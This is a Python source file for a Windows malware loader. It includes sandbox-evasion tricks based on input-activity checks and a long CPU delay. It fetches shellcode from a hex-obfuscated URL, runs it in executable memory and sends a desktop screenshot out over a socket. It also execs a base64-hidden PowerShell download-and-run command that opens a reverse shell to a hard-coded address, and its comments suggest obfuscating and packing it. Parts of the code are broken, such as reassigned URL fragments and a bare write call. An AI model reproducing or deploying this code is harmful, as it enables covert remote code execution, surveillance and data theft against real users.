from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import time
import win32api
import win32file
import os
import socket
import base64
import ctypes
import win32con
import win32gui
import win32ui
from urllib import request
import subprocess, sys

# Λόγιζε προ έργου.

# If you want to execute it.  Obsfucate the variables and generate stages of payload execution
# and I would also suggest :  packer + pyinstaller !


kernel32 = ctypes.windll.kernel32  # Initiate our kernel


def get_dimensions():  # (1)
    width = win32api.GetSystemMetrics(
        win32con.SM_CXVIRTUALSCREEN)  # Retrieves the specified system metric or system configuration settings. all
    # dimensions retrieved by GetSystemMetrics are in pixels
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return width, height, left, top


def screenshot(name='screenshot'):
    hdesktop = win32gui.GetDesktopWindow()  # Retrieves a handle to the desktop window.
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(
        hdesktop)  # The GetWindowDC function retrieves the device context (DC), and we pass the handle to which
    # window we want (A device context is a structure that defines a set of graphic objects and their associated
    # attributes, as well as the graphic modes that affect output.)
    img_dc = win32ui.CreateDCFromHandle(
        desktop_dc)  # The CreateDC function creates a device context (DC) from an integer handle
    mem_dc = img_dc.CreateCompatibleDC()  # The CreateCompatibleDC function creates a memory device context (DC)
    # compatible with the specified device.To enable applications to place output in memory rather than sending it to
    # an actual device, use a special device context for bitmap operations called a memory device context

    screenshot = win32ui.CreateBitmap()  # Create a bitmap.  A bitmap is a graphical object used to create,
    # manipulate and store images as files on a disk
    screenshot.CreateCompatibleBitmap(img_dc, width,
                                      height)  # The CreateCompatibleBitmap function creates a bitmap compatible with
    # the device that is associated with the specified device context.Parameters of creating a bitmap( A handle to a
    # device context, specified width, height, and The bitmap height, in pixels.
    mem_dc.SelectObject(
        screenshot)  # The SelectObject function selects an object into the specified device context (DC).The new
    # object replaces the previous object of the same type.Params( ,A handle to the object to be selected)

    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),
                  win32con.SRCCOPY)  # Take a bit-for-bit copy of the desktop image and store it in the memory-based
    # context. SRCCOPY= Copies the source rectangle directly to the destination rectangle.
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

    mem_dc.DeleteDC()  # The DeleteDC function deletes the specified device context (DC).
    win32gui.DeleteObject(
        screenshot.GetHandle())  # Deletes the bitmap through the handle. freeing all system resources associated
    # with the object. After the object is deleted, the specified handle is no longer valid.


class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_ulong)
    ]


def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    run_time = windll.kernel32.GetTickCount()
    elapsed = run_time - struct_lastinputinfo.dwTime

    return elapsed


class Detector:
    def __init__(self):
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    def get_key_press(self):
        for i in range(0, 0xff):
            state = win32api.GetAsyncKeyState(i)
            if state & 0x0001:
                if i == 0x1:
                    self.mouse_clicks += 1
                    return time.time()
                elif i > 32 and i < 127:
                    self.keystrokes += 1
        return None

    def detect(self):
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35

        max_double_clicks = 10
        max_keystrokes = random.randint(10, 25)
        print(max_keystrokes)
        max_mouse_clicks = random.randint(5, 25)
        print(max_mouse_clicks)
        max_input_threshold = 2000000  # 33.333333 min

        detection_complete = False
        while not detection_complete:
            last_input = get_last_input()
            if last_input >= max_input_threshold:
                os.remove('./temp.exe')

            keypress_time = self.get_key_press()
            if keypress_time is not None and previous_timestamp is not None:
                elapsed = keypress_time - previous_timestamp

                if elapsed <= double_click_threshold:
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()
                    else:
                        if self.double_clicks >= max_double_clicks:
                            if (keypress_time - first_double_click <=
                                    (max_double_clicks * double_click_threshold)):
                                os.remove('./temp.exe')

                if (self.keystrokes >= max_keystrokes and
                        self.double_clicks >= max_double_clicks and
                        self.mouse_clicks >= max_mouse_clicks):
                    detection_complete = True

                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time


def transmit(document_path):  # windows only

    client = socket.socket()
    ta = "68" + "74" + " 74" + "70" + "3a"
    pa = "2f" + "2f" + "31" + "39"
    nta = "32" + "2e" + "31" + "36"
    ka8 = "38" + "2e" + "31" + "2e"
    ar = "31" + "33" + "3a" + "38"
    i8 = "30" + "30" + "30" + "2f"
    mon = "6d" + "79" + "33" + "32"
    gi = "73" + "68" + "65" + "6c"
    gno = "6c" + "63" + "6f" + "64"
    ntai = "65" + "2e" + "62" + "69" + "6e"
    url = ta + pa + nta + ka8 + ar + i8 + mon + gi + gno + ntai
    url = bytes.fromhex(url)
    url = url.decode("ascii")
    client.connect(url, 1000)
    with open(document_path, 'rb') as f:
        win32file.TransmitFile(client, win32file._get_osfhandle(f.fileno()), 0, 0, None, 0, b'', b'')


def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())

    return shellcode


def write_memory(buf):  # write the buffer into memory
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p  # allocates memory (we get back a pointer as you see)
    ptr = kernel32.VirtualAlloc(None, length, 0x3000,
                                0x40)  # The starting address of the region to allocate(If NULL the system determines where to allocate the region,The size of the region in bytes because we have NULL this value is rounded up to the next page boundary,MEM_RESERVE AND MEM_COMMIT in one step,read/write/execute permissions)

    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p,
                                       ctypes.c_size_t)  # move the buffer into the memory(A pointer to the destination memory block to copy the bytes to,A pointer to the source memory block to copy the bytes from,The number of bytes to copy )
    kernel32.RtlMoveMemory(ptr, buf, length)  # Copy to ,From, number of bytes
    return ptr  # return the pointer to the buffer


def run(shellcode):
    screenshot()
    with open('th3g3ntl3m4n.bmp', 'wb') as f:
        f.write()
        f.close()
    buf = ctypes.create_string_buffer(shellcode)  # alocate a buffer to hold the shellcode
    ptr = write_memory(buf)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))  # cast our buffer to be as a function pointer
    shell_func()  # execute the shellcode


# def testtosee():
#
#     sample_string = """
# import subprocess, sys
# def hello():
#
#     subprocess.call('powershell.exe IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.1 4242', shell=False)
# hello() """
#     sample_string_bytes = sample_string.encode("ascii")
#     base64_bytes = base64.b64encode(sample_string_bytes)
#     base64_string = base64_bytes.decode("ascii")
#     exec(base64.b64decode(base64_string))


# A common way to generate stages of payload execution ! Check the above code if you are not familiar !
def testtosee():
    whatislove = 'ICAgIAppbXBvcnQgc3VicHJvY2Vzcywgc3lzICAgICAKZGVmIGhlbGxvKCk6ICAgICAgICAKICAgICAKICAgIHN1YnByb2Nlc3MuY2FsbCgncG93ZXJzaGVsbC5leGUgSUVYKElXUiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYW50b25pb0NvY28vQ29uUHR5U2hlbGwvbWFzdGVyL0ludm9rZS1Db25QdHlTaGVsbC5wczEgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1Db25QdHlTaGVsbCAxOTIuMTY4LjEuMSA0MjQyJywgc2hlbGw9RmFsc2UpCmhlbGxvKCkg'
    exec(base64.b64decode(whatislove))
    os.remove('./temp.exe')


if __name__ == '__main__':
    ox1 = 7777 ** 1234567 # calculate heavy maths (around 5 minutes depends on the cpu) for sandbox Evasion
    ox41 = Detector()
    ox41.detect()
    screenshot()
    ou = "68" + "74" + " 74" + "70" + "3a"
    ta = "2f" + "2f" + "31" + "39"
    pa = "32" + "2e" + "31" + "36"
    n = "38" + "2e" + "31" + "2e"
    ta = "31" + "33" + "3a" + "38"
    tois = "30" + "30" + "30" + "2f"
    pasi = "6d" + "79" + "33" + "32"
    r = "73" + "68" + "65" + "6c"
    h = "6c" + "63" + "6f" + "64"
    ta = "65" + "2e" + "62" + "69" + "6e"
    url = ou+ta+pa+n+ta+tois+pasi+r+h+ta
    url = bytes.fromhex(url)
    url = url.decode("ascii")
    shellcode = get_code(url)
    run(shellcode)
    transmit('./th3g3ntl3m4n.bmp')
    os.remove('./th3g3ntl3m4n.bmp')
    testtosee()
    

